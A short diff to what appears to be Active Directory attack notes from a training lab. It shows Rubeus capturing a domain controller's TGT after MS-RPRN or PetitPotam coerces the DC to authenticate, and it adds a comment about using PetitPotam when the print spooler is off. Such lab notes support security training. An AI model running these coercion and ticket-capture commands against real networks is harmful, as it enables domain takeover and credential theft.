@@ -95,7 +95,8 @@ C:> Rubeus.exe monitor /targetuser:<dc-name>$ /interval:5 /nowrap
 C:> MS-RPRN.exe \\<DC_fqdn_name> \\<server_to_compromise_fqdn>
 RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.     # This error is OK
 
-# PetiPoam can be user as well
+# PetiPoam can be user as well. Does the same.
+# USefull when no print spooler enabled
 C:> PetitPotam.exe dcorp-appsrv dcorp-dc
 
 # At this point, in Rubeus we got the TGT for DC auth.
